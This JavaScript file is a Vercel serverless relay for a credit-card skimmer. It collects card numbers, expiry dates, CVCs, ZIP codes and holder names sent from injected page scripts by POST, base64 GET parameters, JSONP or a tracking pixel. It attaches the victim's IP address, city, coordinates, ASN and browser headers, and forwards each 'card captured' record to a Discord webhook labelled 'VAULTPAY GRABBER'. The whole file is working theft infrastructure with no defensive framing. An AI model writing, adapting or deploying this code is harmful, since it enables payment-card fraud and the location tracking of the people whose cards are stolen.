// api/collect.js — Vercel serverless relay
// Env: WEBHOOK_URL = https://discord.com/api/webhooks/xxx/yyy
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, Accept',
  'Access-Control-Expose-Headers': 'Content-Type',
  'Access-Control-Max-Age': '86400',
  'Vary': 'Origin',
  'Cache-Control': 'no-store'
};
const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

function geo(req) {
  const h = req.headers;
  const fwd = (h['x-forwarded-for'] || '').split(',')[0].trim();
  return {
    ip: h['x-real-ip'] || fwd || h['x-vercel-forwarded-for'] || '-',
    country: h['x-vercel-ip-country'] || '',
    region: h['x-vercel-ip-country-region'] || '',
    city: h['x-vercel-ip-city'] ? decodeURIComponent(h['x-vercel-ip-city']) : '',
    lat: h['x-vercel-ip-latitude'] || '',
    lon: h['x-vercel-ip-longitude'] || '',
    tz: h['x-vercel-ip-timezone'] || '',
    asn: h['x-vercel-ip-as-number'] || ''
  };
}

function fmt(c, g, req) {
  const n = String(c.num || '').replace(/\D/g, '');
  const geoStr = [g.city, g.region, g.country].filter(Boolean).join(', ') || '-';
  return {
    username: 'VAULTPAY GRABBER',
    embeds: [{
      title: 'card captured',
      color: 0x39ff9e,
      fields: [
        { name: 'card', value: '`' + (n.replace(/(.{4})/g, '$1 ').trim() || 'n/a') + '`' },
        { name: 'exp', value: '`' + (c.exp || '??') + '`', inline: true },
        { name: 'cvc', value: '`' + (c.cvc || '???') + '`', inline: true },
        { name: 'zip', value: '`' + (c.zip || '-') + '`', inline: true },
        { name: 'holder', value: '`' + (c.name || 'n/a') + '`', inline: true },
        { name: 'trigger', value: String(c.src || 'unknown') + (c.late ? ' (late cvc)' : ''), inline: true },
        { name: 'edge ip', value: '`' + g.ip + '`', inline: true },
        { name: 'edge geo', value: geoStr, inline: true },
        { name: 'coords', value: (g.lat && g.lon) ? g.lat + ',' + g.lon : '-', inline: true },
        { name: 'edge tz', value: g.tz || '-', inline: true },
        { name: 'asn', value: g.asn || '-', inline: true },
        { name: 'edge ua', value: String(req.headers['user-agent'] || '-').slice(0, 220) },
        { name: 'referer', value: String(req.headers.referer || '-').slice(0, 220) },
        { name: 'accept-lang', value: String(req.headers['accept-language'] || '-').slice(0, 90) }
      ],
      footer: { text: 'VaultPay relay · ' + new Date().toISOString() }
    }]
  };
}

export default async function handler(req, res) {
  for (const k in CORS) res.setHeader(k, CORS[k]);
  if (req.method === 'OPTIONS') return res.status(204).end();

  const url = new URL(req.url, 'https://' + (req.headers.host || 'localhost'));
  const hook = url.searchParams.get('webhook') || process.env.WEBHOOK_URL;
  const cb = url.searchParams.get('cb');
  const wantsPixel = req.method === 'GET' && url.searchParams.get('pixel') === '1';

  let data = null;
  if (req.method === 'GET') {
    const d = url.searchParams.get('d');
    if (d) { try { data = JSON.parse(Buffer.from(d, 'base64').toString('utf8')); } catch (e) { data = null; } }
  } else {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) { body = { raw: body }; } }
    data = body || null;
  }

  if (!data) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(200).json({ ok: true, armed: !!hook, cors: '*', geo: geo(req) });
  }

  const g = geo(req);
  const payload = data.embeds ? data : fmt(data, g, req);

  let forwarded = false;
  if (hook) {
    try {
      const r = await fetch(hook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      forwarded = r.ok;
    } catch (e) { forwarded = false; }
  }

  if (cb) {
    res.setHeader('Content-Type', 'application/javascript');
    return res.status(200).send(cb + '(' + JSON.stringify({ ok: true, forwarded, geo: g }) + ')');
  }
  if (wantsPixel) {
    res.setHeader('Content-Type', 'image/gif');
    return res.status(200).send(PIXEL);
  }
  res.setHeader('Content-Type', 'application/json');
  return res.status(200).json({ ok: true, forwarded, armed: !!hook, geo: g });
}
